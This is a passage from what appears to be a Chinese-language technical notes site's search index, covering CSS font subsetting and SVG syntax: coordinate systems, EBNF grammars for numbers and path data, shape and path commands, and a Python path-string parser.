<p>\u4e3a\u4e86\u9632\u6b62\u52a0\u8f7d\u5927\u578b\u5b57\u4f53\u6587\u4ef6\u65f6\u5361\u4f4f\uff0c\u53ef\u4ee5\u5c06\u5b57\u4f53\u6587\u4ef6\u62c6\u5206\u4e3a\u591a\u4e2a\u5b50\u96c6\uff08subset\uff09\uff0c\u6bcf\u4e2a\u5b50\u96c6\u53ea\u5305\u542b\u90e8\u5206\u5b57\u7b26\uff0c\u7136\u540e\u6839\u636e\u9700\u8981\u52a0\u8f7d\u5bf9\u5e94\u7684\u5b50\u96c6\uff1a</p> <pre><code>@font-face {\n    font-family: \"Font Name\";\n    src: url(\"path/to/font-subset1.woff2\") format(\"woff2\");\n    unicode-range: ...;\n}\n@font-face {\n    font-family: \"Font Name\";\n    src: url(\"path/to/font-subset2.woff2\") format(\"woff2\");\n    unicode-range: ...;\n}\n</code></pre> <p>\u53ef\u4ee5\u5229\u7528  KonghaYao/cn-font-split \u7b49\u5de5\u5177\u6765\u62c6\u5206\u5b57\u4f53\u6587\u4ef6\u3002</p>"},{"location":"devops/frontend/svg/","title":"SVG","text":"<p> \u7ea6 2446 \u4e2a\u5b57  224 \u884c\u4ee3\u7801  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p> <p>Abstract</p> <p>SVG\uff08Scalable Vector Graphics\uff09\u662f\u4e00\u79cd\u57fa\u4e8e XML \u63cf\u8ff0\u77e2\u91cf\u56fe\u5f62\u7684\u56fe\u7247\u683c\u5f0f</p> <p>\u73b0\u884c\u6807\u51c6\u662f SVG 2\uff1ahttps://www.w3.org/TR/SVG/SVG 1.1\uff1ahttps://www.w3.org/TR/SVG11/ SVG 2 \u4ecd\u5728 CR \u9636\u6bb5\uff0c\u533a\u522b\uff1ahttps://www.w3.org/TR/SVG/changes.html</p> <p>REC-SVG11-20110816.pdf</p> <p>SVG \u6807\u51c6\u6587\u6863\u8fd8\u6ca1\u6709\u5b8c\u6574\u8bfb\u8fc7\uff0c\u8fd9\u91cc\u53ea\u662f\u4e00\u4e9b\u5728\u4fee manim \u7684 SVGMobject \u7684\u65f6\u5019\u5b66\u5230\u7684 SVG \u76f8\u5173\u5185\u5bb9</p> <ul> <li>SVG Namespace: <code>http://www.w3.org/2000/svg</code></li> <li>Public Identifier for SVG 1.1: <code>PUBLIC \"-//W3C//DTD SVG 1.1//EN\"</code></li> <li>System Identifier for the SVG 1.1 Recommendation: <code>http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd</code></li> </ul>"},{"location":"devops/frontend/svg/#_1","title":"\u5750\u6807\u7cfb\u7edf","text":"<p>\u5de6\u4e0a\u89d2\u4e3a\u539f\u70b9\uff0c\u5411\u53f3\u4e3a x \u6b63\u65b9\u5411\uff0c\u5411\u4e0b\u4e3a y \u6b63\u65b9\u5411</p> <p>transform \u5c5e\u6027\u4f1a\u6539\u53d8\u5143\u7d20\u53ca\u5176\u5b50\u5143\u7d20\u7684\u5750\u6807\u7cfb</p>"},{"location":"devops/frontend/svg/#ebnf","title":"\u5e38\u89c1 EBNF \u8bed\u6cd5","text":"\u4e00\u4e9b SVG \u7684 EBNF <pre><code>coordinate-pair:\n    coordinate comma-wsp coordinate\n    | coordinate negative-coordinate\ncoordinate:\n    number\nnumber:\n    sign? integer-constant\n    | sign? floating-point-constant\nnegative-coordinate:\n    \"-\" integer-constant\n    | \"-\" floating-point-constant\ncomma-wsp:\n    (wsp+ comma? wsp*) | (comma wsp*)\ncomma:\n    \",\"\ninteger-constant:\n    digit-sequence\nfloating-point-constant:\n    fractional-constant exponent?\n    | digit-sequence exponent\nfractional-constant:\n    digit-sequence? \".\" digit-sequence\n    | digit-sequence \".\"\nexponent:\n    ( \"e\" | \"E\" ) sign? digit-sequence\nsign:\n    \"+\" | \"-\"\ndigit-sequence:\n    digit\n    | digit digit-sequence\ndigit:\n    \"0\" | \"1\" | \"2\" | \"3\" | \"4\" | \"5\" | \"6\" | \"7\" | \"8\" | \"9\"\nwsp:\n    (#x20 | #x9 | #xD | #xA)+\n</code></pre> <p>\u4ece\u540e\u5f80\u524d\u6765\u770b\uff1a</p> <ul> <li>wsp\uff1a\u7a7a\u683c\uff0c\u5305\u542b\u56db\u79cd\uff0cASCII \u7801\u503c\u4e3a <code>0x9, 0x20, 0xA, 0xD</code>\uff08SVG2 \u4e2d\u591a\u4e86 <code>0xC</code>\uff09\uff0c\u5e76\u4e14\u53ef\u4ee5\u8fde\u7eed\u591a\u4e2a</li> <li>digit: \u6570\u5b57\u5b57\u7b26\uff0c0 \u5230 9</li> <li>digit-sequence: \u6570\u5b57\u5b57\u7b26\u5e8f\u5217\uff0c\u53ef\u4ee5\u4e3a\u5355\u4e2a\u6216\u8005\u591a\u4e2a\u6570\u5b57\u5b57\u7b26</li> <li>sign: \u7b26\u53f7\uff0c+ \u6216 -</li> <li>exponent: \u6307\u6570\uff0ce \u5927\u5c0f\u5199\u5747\u53ef\uff0c\u6307\u6570\u662f\u6709\u7b26\u53f7\u6216\u8005\u65e0\u7b26\u53f7\uff08\u5373\u6b63\uff09\u6574\u6570\uff0c\u5982 <code>e2 E+2 E-10</code> \u5747\u4e3a\u5408\u6cd5 exponent</li> <li>fractional-constant: \u5206\u6570\u5e38\u6570\uff0c\u6574\u6570\u90e8\u5206\u4e3a 0 \u53ef\u4ee5\u7701\u7565\uff0c\u5c0f\u6570\u90e8\u5206\u4e3a 0 \u4e5f\u53ef\u4ee5\u7701\u7565\uff0c\u5982 <code>1.2 .3 4.</code> \u53ef\u4ee5\u8868\u793a\u4e09\u4e2a\u5206\u6570\u5e38\u6570 1.2, 0.3, 4.0</li> <li>floating-point-constant: \u6d6e\u70b9\u6570\u5e38\u6570\uff0c\u53ef\u4ee5\u662f \u5206\u6570\u5e38\u6570 / \u5206\u6570\u5e38\u6570\u52a0\u6307\u6570 / \u6574\u6570\u5e38\u6570\u52a0\u6307\u6570</li> <li>integer-constant: \u6574\u6570\u5e38\u6570\uff0c\u5373\u6570\u5b57\u5b57\u7b26\u5e8f\u5217</li> <li>comma: \u9017\u53f7\u5b57\u7b26 <code>,</code>\uff0cASCII \u7801\u503c <code>0x2C</code></li> <li>comma-wsp: \u95f4\u9694\u7b26\uff0c\u53ef\u4ee5\u662f \u9017\u53f7 / \u9017\u53f7\u52a0\u4efb\u610f\u591a\u7a7a\u683c / \u4efb\u610f\u591a\u7a7a\u683c / \u4efb\u610f\u591a\u7a7a\u683c\u52a0\u9017\u53f7\u52a0\u4efb\u610f\u591a\u7a7a\u683c</li> <li>negative-coordinate: \u8d1f\u5750\u6807\u503c\uff0c\u53ef\u4ee5\u662f \u8d1f\u53f7\u52a0\u6574\u6570\u5e38\u6570 / \u8d1f\u53f7\u52a0\u6d6e\u70b9\u6570\u5e38\u6570</li> <li>number: \u6570\u5b57\uff0c\u6709\u7b26\u53f7\u6216\u8005\u65e0\u7b26\u53f7\uff08\u6b63\uff09\u7684\u6574\u6570\u5e38\u6570\u6216\u8005\u6d6e\u70b9\u6570\u5e38\u6570</li> <li>coordinate: \u5750\u6807\u503c\uff0c\u5373\u6570\u5b57 number</li> <li>coordinate-pair: \u5750\u6807\uff0c\u53ef\u4ee5\u662f\u4e24\u4e2a\u7528 comma-wsp \u5206\u9694\u7684\u5750\u6807\u503c\uff0c\u7b2c\u4e8c\u4e2a\u5750\u6807\u503c\u4e3a\u8d1f\u7684\u65f6\u5019\u53ef\u4ee5\u4e0d\u8fdb\u884c\u5206\u9694\uff0c\u5373 <code>1-2</code> \u8868\u793a (1, -2)</li> </ul>"},{"location":"devops/frontend/svg/#_2","title":"\u8bfb\u53d6\u6570\u5b57\u7684\u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p>\u4ece\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\u51fa\u4e0a\u9762\u7684 number \u53ef\u4ee5\u76f4\u63a5\u7528\u4e00\u4e2a\u6b63\u5219\u6765\u89e3\u51b3\uff1a <pre><code>[-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)?\n</code></pre>  \u4e5f\u5c31\u662f\u4e0a\u9762\u7684\u6574\u4e2a\u903b\u8f91</p> <ul> <li>\u6574\u4f53\u53ef\u4ee5\u662f +- \u6216\u8005\u4e0d\u6307\u5b9a\uff1a<code>[-+]?</code></li> <li>\u6307\u6570\u524d\u90e8\u5206\uff1a<code>(?:\\d+(?:\\.\\d*)?|\\.\\d+)</code><ul> <li>\u6709\u6574\u6570\u90e8\u5206\uff1a<code>\\d+(?:\\.\\d*)?</code><ul> <li>\u6574\u6570\u90e8\u5206\uff1a<code>\\d+</code></li> <li>\u5c0f\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a<code>(?:\\.\\d*)?</code><ul> <li>\u5c0f\u6570\u70b9\uff1a<code>\\.</code></li> <li>\u5c0f\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a<code>\\d*</code></li> </ul> </li> </ul> </li> <li>\u65e0\u6574\u6570\u90e8\u5206\uff08\u5373\u5ffd\u7565 0\uff09\uff1a<code>\\.\\d+</code><ul> <li>\u5c0f\u6570\u70b9\uff1a<code>\\.</code></li> <li>\u5c0f\u6570\u90e8\u5206\uff08\u4e00\u5b9a\u6709\uff09\uff1a<code>\\d+</code></li> </ul> </li> </ul> </li> <li>\u6307\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a<code>(?:[eE][-+]?\\d+)?</code><ul> <li>\u6307\u6570\u6807\u8bc6\uff1a<code>[eE]</code></li> <li>\u7b26\u53f7\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a<code>[-+]?</code></li> <li>\u6307\u6570\u90e8\u5206\uff08\u4e00\u5b9a\u6709\uff0c\u4e14\u662f\u6574\u6570\uff09\uff1a<code>\\d+</code></li> </ul> </li> </ul> <p>\u4e3a\u4e86\u4e0d\u6355\u83b7 () \u4e2d\u7684\u5185\u5bb9\uff0c\u9700\u8981\u4f7f\u7528 (?:) \u4f7f\u7528\u7684\u65f6\u5019\u76f4\u63a5\u628a\u5339\u914d\u5230\u7684\u5185\u5bb9\u4f20\u5165 float \u5373\u53ef\uff1a <pre><code>number_pattern = re.compile(r\"[-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)?\")\nnumbers = [float(x) for x in number_pattern.findall(number_string)]\n</code></pre></p>"},{"location":"devops/frontend/svg/#svg_1","title":"&lt;svg&gt; \u5143\u7d20","text":"<p>\u5728\u4e00\u4e2a SVG \u4e2d\uff0c\u53ef\u4ee5\u6709\u5f88\u591a &lt;svg&gt; \u5143\u7d20\uff0c\u6700\u5916\u5c42\u53ea\u6709\u4e00\u4e2a &lt;svg&gt; \u5143\u7d20\uff0c\u5185\u5c42\u53ef\u4ee5\u5d4c\u5957</p> <p>svg \u89c4\u5b9a\u7684\u5143\u7d20\u90fd\u5728 XML \u547d\u540d\u7a7a\u95f4 http://www.w3.org/2000/svg \u4e2d\uff0c\u6240\u4ee5\u8981\u89c4\u5b9a <code>xmlns=\"http://www.w3.org/2000/svg\"</code></p> <p>\u5c5e\u6027\uff1a</p> version \u7248\u672c\u53f7\uff0c1.1 / 1.0  x \u5bf9\u4e8e\u6700\u5916\u5c42 svg \u5143\u7d20\u6ca1\u6709\u4f5c\u7528\uff0c\u5bf9\u4e8e\u5185\u5c42 svg \u5143\u7d20\u6307\u5b9a\u8fb9\u754c\u7684\u5de6\u4e0a\u89d2\u7684 x \u5750\u6807 y \u5bf9\u4e8e\u6700\u5916\u5c42 svg \u5143\u7d20\u6ca1\u6709\u4f5c\u7528\uff0c\u5bf9\u4e8e\u5185\u5c42 svg \u5143\u7d20\u6307\u5b9a\u8fb9\u754c\u7684\u5de6\u4e0a\u89d2\u7684 y \u5750\u6807 width \u89c4\u5b9a\u5bbd\u5ea6\uff0c\u53ef\u4ee5\u662f\u957f\u5ea6\u6216\u8005\u767e\u5206\u6bd4 height \u89c4\u5b9a\u9ad8\u5ea6"},{"location":"devops/frontend/svg/#_3","title":"\u5176\u4ed6\u7ed3\u6784\u5143\u7d20","text":"<ul> <li>&lt;g&gt;\uff1a\u5373 group\uff0c\u53ef\u4ee5\u6709\u5b50\u5143\u7d20\uff0c\u5e76\u4e14\u53ef\u4ee5\u6709 id \u7528\u6765\u5f15\u7528</li> <li>&lt;defs&gt;\uff1a\u5305\u542b\u4e00\u4e9b\u5b50\u5143\u7d20\uff0c\u7528\u6765\u590d\u7528\uff0c\u4e0d\u76f4\u63a5\u663e\u793a</li> <li>&lt;symbol&gt;\uff1a\u7c7b\u4f3c &lt;g&gt;</li> <li>&lt;use&gt;\uff1a\u590d\u7528\uff0c\u901a\u8fc7 <code>xlink:href</code> \u6765\u6307\u5b9a\u5f15\u7528\u5bf9\u8c61\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528 x, y, style \u7b49\u4e00\u7cfb\u5217\u5c5e\u6027\u6765\u89c4\u5b9a\u4f4d\u7f6e\u548c\u6837\u5f0f</li> </ul>"},{"location":"devops/frontend/svg/#_4","title":"\u5f62\u72b6\u5143\u7d20","text":"\u5143\u7d20 \u5c5e\u6027 &lt;rect&gt; x, y \u5de6\u4e0a\u89d2\u5750\u6807width, height \u77e9\u5f62\u5bbd\u9ad8 &lt;circle&gt; cx, cy \u5706\u5fc3\u5750\u6807r \u5706\u534a\u5f84 &lt;ellipse&gt; cx, cy \u692d\u5706\u4e2d\u5fc3\u5750\u6807rx, ry \u6c34\u5e73/\u5782\u76f4\u534a\u5f84 &lt;line&gt; x1, y1 \u8d77\u70b9\u5750\u6807x2, y2 \u7ec8\u70b9\u5750\u6807 &lt;polygon&gt; points \u591a\u8fb9\u5f62\u7aef\u70b9\u5750\u6807 &lt;polyline&gt; points \u6298\u7ebf\u7aef\u70b9\u5750\u6807 &lt;path&gt; d \u8def\u5f84\u6307\u4ee4"},{"location":"devops/frontend/svg/#polygon-polyline-points","title":"&lt;polygon&gt; \u548c &lt;polyline&gt; \u7684 points \u8bed\u6cd5","text":"EBNF \u8bed\u6cd5 <p>\u5b83\u4eec\u7684 points \u5c5e\u6027\u7684\u503c\u90fd\u662f list-of-points \u7c7b\u578b <pre><code>list-of-points:\n    wsp* coordinate-pairs? wsp*\ncoordinate-pairs:\n    coordinate-pair\n    | coordinate-pair comma-wsp coordinate-pairs\n</code></pre></p> <p>\u7531\u4e0a\u9762\u7684\u89e3\u91ca\u540c\u7406\uff0c\u8fd9\u4e2a EBNF \u4e5f\u975e\u5e38\u6e05\u6670</p> <ul> <li>coordinate-pairs: \u5750\u6807\u7ec4\uff0c\u7528 comma-wsp \u5206\u9694\u7684\u591a\u4e2a\u5750\u6807</li> <li>list-of-points: \u70b9\u96c6\uff0c\u53ef\u4ee5\u662f \u7a7a / \u4efb\u610f\u591a\u7a7a\u683c / \u524d\u540e\u6709\u4efb\u610f\u591a\u7a7a\u683c\uff08\u542b0\uff09\u7684\u5750\u6807\u7ec4</li> </ul> <p>points \u4e5f\u53ef\u4ee5\u76f4\u63a5\u8f6c\u6362\u4e3a path string\uff0cmanim \u4e2d\u5c31\u662f\u8fd9\u6837\u5904\u7406\u7684\uff0c\u5373\u628a\u6240\u6709 wsp digit \u90fd\u66ff\u6362\u4e3a \"L\" wsp digit\uff0c\u7136\u540e\u628a\u7b2c\u4e00\u4e2a L \u66ff\u6362\u4e3a M</p>"},{"location":"devops/frontend/svg/#path","title":"&lt;path&gt; \u8def\u5f84","text":"<p>&lt;path&gt; \u5143\u7d20\u901a\u8fc7\u5b83\u7684 <code>d</code> \u5c5e\u6027\u6765\u6307\u5b9a\u8def\u5f84\uff0c\u503c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32 \u8fd9\u4e2a\u8def\u5f84\u5b57\u7b26\u4e32\u7531\u4e00\u4e9b\u63a7\u5236\u547d\u4ee4\u548c\u540e\u9762\u63a5\u7740\u7684\u53c2\u6570\u6784\u6210\uff0c\u4e00\u5171\u5341\u79cd\u63a7\u5236\u547d\u4ee4\uff0c\u5206\u522b\u6709\u5927\u5199\u548c\u5c0f\u5199\u7684\u5f62\u5f0f \u5927\u5199\u8868\u793a\u540e\u9762\u7684\u53c2\u6570\u91cc\u7684\u5750\u6807\u662f\u7edd\u5bf9\u4f4d\u7f6e\uff0c\u5c0f\u5199\u8868\u793a\u540e\u9762\u7684\u53c2\u6570\u91cc\u7684\u5750\u6807\u662f\u76f8\u5bf9\u4e8e\u5f53\u524d\u5750\u6807\u7684\u76f8\u5bf9\u4f4d\u7f6e</p> <p>\u5e76\u4e14\u4e3a\u4e86\u538b\u7f29 SVG \u7684\u5927\u5c0f\uff0c\u4e5f\u6709\u4e00\u4e9b\u5141\u8bb8\u7684\u7f29\u5199\u89c4\u5219\uff1a</p> <ul> <li>\u53ef\u4ee5\u7701\u7565\u4e0d\u5fc5\u8981\u7684 comma-wsp \u5206\u9694\u7b26</li> <li>\u5982\u679c\u591a\u6b21\u4f7f\u7528\u540c\u4e00\u4e2a\u547d\u4ee4\uff0c\u5219\u9664\u4e86\u7b2c\u4e00\u6b21\u4ee5\u5916\u5747\u53ef\u4ee5\u7701\u7565\u547d\u4ee4</li> <li>\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5750\u6807</li> <li>\u53ef\u4ee5\u4f7f\u7528\u6c34\u5e73\u548c\u5782\u76f4\u60c5\u51b5\u7684 lineto</li> <li>\u53ef\u4ee5\u7528 S/s/T/t \u6765\u7701\u7565\u7b2c\u4e00\u4e2a\u63a7\u5236\u70b9</li> </ul> <p>\u4e0b\u9762\u4f9d\u6b21\u6765\u8bf4\u660e\u8fd9\u5341\u79cd\u63a7\u5236\u547d\u4ee4\uff1a</p> \u547d\u4ee4 \u540d\u79f0 \u53c2\u6570 \u63cf\u8ff0 M or m moveto (x y)+ \u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u8def\u5f84\uff0c\u53c2\u6570\u662f\u8d77\u70b9\u5750\u6807\u5982\u679c\u53c2\u6570\u662f\u591a\u7ec4\u5750\u6807\uff0c\u5219\u9664\u7b2c\u4e00\u4e2a\u4ee5\u5916\u90fd\u5f53\u6210 L/l \u6307\u4ee4\u7684\u53c2\u6570\u6765\u5904\u7406 Z or z closepath \u5173\u95ed\u8def\u5f84\uff0c\u5373\u4ece\u5f53\u524d\u70b9\u5230\u5f53\u524d\u5b50\u8def\u5f84\u5f00\u5934\u70b9\u753b\u4e00\u6761\u76f4\u7ebfZ \u548c z \u7684\u6548\u679c\u76f8\u540c L or l lineto (x y)+ \u4ece\u5f53\u524d\u70b9\u5f00\u59cb\u753b\u76f4\u7ebf\uff0c\u53c2\u6570\u662f\u7aef\u70b9\u5750\u6807 H or h horizontal lineto x+ \u753b\u4e00\u6761\u6c34\u5e73\u7ebf\uff0c\u5230\u6a2a\u5750\u6807 x \u7684\u4f4d\u7f6e V or v vertical lineto y+ \u753b\u4e00\u6761\u7ad6\u76f4\u7ebf\uff0c\u5230\u7eb5\u5750\u6807 y \u7684\u4f4d\u7f6e C or c curveto (x1 y1 x2 y2 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e09\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf\u5176\u4e2d (x1, y1) \u662f\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\uff0c(x2, y2) \u662f\u7ed3\u675f\u70b9\u7684\u63a7\u5236\u70b9 S or s smooth curveto (x1 y1 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e09\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf\u5176\u4e2d\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\u662f\u4e0a\u4e00\u6761\u4e09\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\u7684\u7b2c\u4e8c\u4e2a\u63a7\u5236\u70b9\u5173\u4e8e\u5f53\u524d\u70b9\u7684\u4e2d\u5fc3\u5bf9\u79f0\u70b9\uff0c(x1, y1) \u662f\u7ed3\u675f\u70b9\u7684\u63a7\u5236\u70b9\u5982\u679c\u6ca1\u6709\u4e0a\u4e00\u6761\u8def\u5f84\u6216\u8005\u4e0a\u4e00\u6761\u8def\u5f84\u4e0d\u662f\u4e09\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\uff08CcSs\uff09\uff0c\u5219\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\u5c31\u662f\u5f53\u524d\u70b9 Q or q quadraticbezier curveto (x1 y1 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e8c\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf\u5176\u4e2d (x1, y1) \u662f\u63a7\u5236\u70b9 T or t smoothquadraticbezier curveto (x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e8c\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf\u5176\u4e2d\u63a7\u5236\u70b9\u662f\u4e0a\u4e00\u6761\u4e8c\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\u63a7\u5236\u70b9\u5173\u4e8e\u5f53\u524d\u70b9\u7684\u4e2d\u5fc3\u5bf9\u79f0\u70b9\u5982\u679c\u6ca1\u6709\u4e0a\u4e00\u6761\u8def\u5f84\u6216\u8005\u4e0a\u4e00\u6761\u8def\u5f84\u4e0d\u662f\u4e8c\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\uff08QqTt\uff09\uff0c\u5219\u63a7\u5236\u70b9\u5c31\u662f\u5f53\u524d\u70b9 A or a elliptical arc <p>\u6700\u540e\u4e00\u4e2a\u692d\u5706\u5f27\u7684\u53c2\u6570\u548c\u7528\u6cd5\u76f8\u5bf9\u590d\u6742\uff0c\u5355\u72ec\u6765\u8bf4\uff1a</p> <ul> <li>\u53c2\u6570\uff1a(rx ry x-axis-rotation large-arc-flag sweep-flag x y)+</li> <li>\u7528\u6cd5\uff1a<ul> <li>rx, ry\uff1a\u692d\u5706\u5f27\u7684\u6c34\u5e73\u548c\u5782\u76f4\u534a\u5f84</li> <li>x-axis-rotation\uff1a\u4e00\u4e2a\u89d2\u5ea6\uff0c\u4ee5 deg \u4e3a\u5355\u4f4d\uff0c\u8868\u793a x \u8f74\u65cb\u8f6c\u89d2\u5ea6</li> <li>large-arc-flag: 0 \u6216 1\uff0c\u662f 0 \u8868\u793a\u8fd9\u6bb5\u692d\u5706\u5f27\u5e94\u8be5\u662f\u52a3\u5f27\uff0c1 \u8868\u793a\u8fd9\u6bb5\u692d\u5706\u5f27\u5e94\u8be5\u662f\u4f18\u5f27</li> <li>sweep-flag\uff1a0 \u6216 1\uff0c\u662f 0 \u8868\u793a\u4ece\u8d77\u70b9\u5230\u7ec8\u70b9\u6cbf\u9006\u65f6\u9488\u753b\u5f27\uff0c1 \u8868\u793a\u4ece\u8d77\u70b9\u5230\u7ec8\u70b9\u987a\u65f6\u9488\u753b\u5f27</li> <li>x, y\uff1a\u7ec8\u70b9\u5750\u6807</li> </ul> </li> </ul> A \u547d\u4ee4\u4f8b\u5b50 <p></p>"},{"location":"devops/frontend/svg/#ebnf_1","title":"EBNF \u8bed\u6cd5","text":"<p>d \u5c5e\u6027\u91cc\u7684\u662f svg-path \u7c7b\u578b\uff0c\u5b9a\u4e49\u662f\uff1a <pre><code>svg-path:\n    wsp* moveto-drawto-command-groups? wsp*\nmoveto-drawto-command-groups:\n    moveto-drawto-command-group\n    | moveto-drawto-command-group wsp* moveto-drawto-command-groups\nmoveto-drawto-command-group:\n    moveto wsp* drawto-commands?\ndrawto-commands:\n    drawto-command\n    | drawto-command wsp* drawto-commands\ndrawto-command:\n    closepath\n    | lineto\n    | horizontal-lineto\n    | vertical-lineto\n    | curveto\n    | smooth-curveto\n    | quadratic-bezier-curveto\n    | smooth-quadratic-bezier-curveto\n    | elliptical-arc\n</code></pre></p> <ul> <li>drawto-command: \u9664\u4e86 M/m \u4ee5\u5916\u7684 9 \u79cd\u547d\u4ee4\u5b57\u7b26\u4e32</li> <li>drawto-commands: \u7528\u4efb\u610f\u591a\uff08\u53ef\u4e3a0\uff09 wsp \u5206\u9694\u7684 drawto-command</li> <li>moveto-drawto-command-group: moveto \u547d\u4ee4\u5f00\u5934\u7684\u547d\u4ee4\u7ec4\uff08\u7528\u4e8e\u6307\u5b9a\u4e00\u4e2a\u5b50\u8def\u5f84\uff09\uff0c\u53ef\u4ee5\u4ec5\u6709 moveto\uff0c\u4e5f\u53ef\u4ee5\u662f\u7531\u4efb\u610f\u591a\uff08\u53ef\u7701\u7565\uff09wsp \u5206\u9694\u7684\u4e00\u4e9b\u547d\u4ee4</li> <li>moveto-drawto-command-groups: \u5b50\u8def\u5f84\u96c6\u5408\uff0c\u7528\u4efb\u610f\u591a\uff08\u53ef\u7701\u7565\uff09wsp \u5206\u9694\u7684 moveto-drawto-command-group</li> <li>svg-path: \u53ef\u4ee5\u4e3a \u7a7a / \u5f00\u5934\u7ed3\u5c3e\u6709\u4efb\u610f\u591a wsp \u7684 moveto-drawto-command-groups</li> </ul> <p>\u4e0b\u9762\u662f\u5404\u4e2a\u547d\u4ee4\u7684\u8bed\u6cd5\uff0c\u90fd\u6bd4\u8f83\u6e05\u6670\uff0c\u5c31\u4e0d\u591a\u89e3\u91ca\u4e86\uff1a</p> \u5404\u4e2a\u547d\u4ee4\u7684\u8bed\u6cd5 <pre><code>moveto:\n    ( \"M\" | \"m\" ) wsp* moveto-argument-sequence\nmoveto-argument-sequence:\n    coordinate-pair\n    | coordinate-pair comma-wsp? lineto-argument-sequence\n\nclosepath:\n    (\"Z\" | \"z\")\n\nlineto:\n    ( \"L\" | \"l\" ) wsp* lineto-argument-sequence\nlineto-argument-sequence:\n    coordinate-pair\n    | coordinate-pair comma-wsp? lineto-argument-sequence\n\nhorizontal-lineto:\n    ( \"H\" | \"h\" ) wsp* horizontal-lineto-argument-sequence\nhorizontal-lineto-argument-sequence:\n    coordinate\n    | coordinate comma-wsp? horizontal-lineto-argument-sequence\n\nvertical-lineto:\n    ( \"V\" | \"v\" ) wsp* vertical-lineto-argument-sequence\nvertical-lineto-argument-sequence:\n    coordinate\n    | coordinate comma-wsp? vertical-lineto-argument-sequence\n\ncurveto:\n    ( \"C\" | \"c\" ) wsp* curveto-argument-sequence\ncurveto-argument-sequence:\n    curveto-argument\n    | curveto-argument comma-wsp? curveto-argument-sequence\ncurveto-argument:\n    coordinate-pair comma-wsp? coordinate-pair comma-wsp? coordinate-pair\n\nsmooth-curveto:\n    ( \"S\" | \"s\" ) wsp* smooth-curveto-argument-sequence\nsmooth-curveto-argument-sequence:\n    smooth-curveto-argument\n    | smooth-curveto-argument comma-wsp? smooth-curveto-argument-sequence\nsmooth-curveto-argument:\n    coordinate-pair comma-wsp? coordinate-pair\n\nquadratic-bezier-curveto:\n    ( \"Q\" | \"q\" ) wsp* quadratic-bezier-curveto-argument-sequence\nquadratic-bezier-curveto-argument-sequence:\n    quadratic-bezier-curveto-argument\n    | quadratic-bezier-curveto-argument comma-wsp? \n        quadratic-bezier-curveto-argument-sequence\nquadratic-bezier-curveto-argument:\n    coordinate-pair comma-wsp? coordinate-pair\n\nsmooth-quadratic-bezier-curveto:\n    ( \"T\" | \"t\" ) wsp* smooth-quadratic-bezier-curveto-argument-sequence\nsmooth-quadratic-bezier-curveto-argument-sequence:\n    coordinate-pair\n    | coordinate-pair comma-wsp? smooth-quadratic-bezier-curveto-argument-sequence\n\nelliptical-arc:\n    ( \"A\" | \"a\" ) wsp* elliptical-arc-argument-sequence\nelliptical-arc-argument-sequence:\n    elliptical-arc-argument\n    | elliptical-arc-argument comma-wsp? elliptical-arc-argument-sequence\nelliptical-arc-argument:\n    nonnegative-number comma-wsp? nonnegative-number comma-wsp? \n        number comma-wsp flag comma-wsp? flag comma-wsp? coordinate-pair\nflag:\n    \"0\" | \"1\"\n</code></pre>"},{"location":"devops/frontend/svg/#path-string-parser","title":"path string parser","text":"python \u5199\u7684 path string \u89e3\u6790 <pre><code>class InvalidPathError(ValueError):\n    pass\n\n\nclass _PathStringParser:\n    # modified from https://github.com/regebro/svg.path/\n    def __init__(self, arguments, rules):\n        self.args = []\n        arguments = bytearray(arguments, \"ascii\")\n        self._strip_array(arguments)\n        while arguments:\n            for rule in rules:\n                self._rule_to_function_map[rule](arguments)\n\n    @property\n    def _rule_to_function_map(self):\n        return {\n            \"x\": self._get_number,\n            \"y\": self._get_number,\n            \"a\": self._get_number,\n            \"u\": self._get_unsigned_number,\n            \"f\": self._get_flag,\n        }\n\n    def _strip_array(self, arg_array):\n        # wsp: (0x9, 0x20, 0xA, 0xC, 0xD) with comma 0x2C\n        # https://www.w3.org/TR/SVG/paths.html#PathDataBNF\n        while arg_array and arg_array[0] in [0x9, 0x20, 0xA, 0xC, 0xD, 0x2C]:\n            arg_array[0:1] = b\"\"\n\n    def _get_number(self, arg_array):\n        pattern = re.compile(rb\"^[-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)?\")\n        res = pattern.search(arg_array)\n        if not res:\n            raise InvalidPathError(f\"Expected a number, got '{arg_array}'\")\n        number = float(res.group())\n        self.args.append(number)\n        arg_array[res.start():res.end()] = b\"\"\n        self._strip_array(arg_array)\n        return number\n\n    def _get_unsigned_number(self, arg_array):\n        number = self._get_number(arg_array)\n        if number &lt; 0:\n            raise InvalidPathError(f\"Expected an unsigned number, got '{number}'\")\n        return 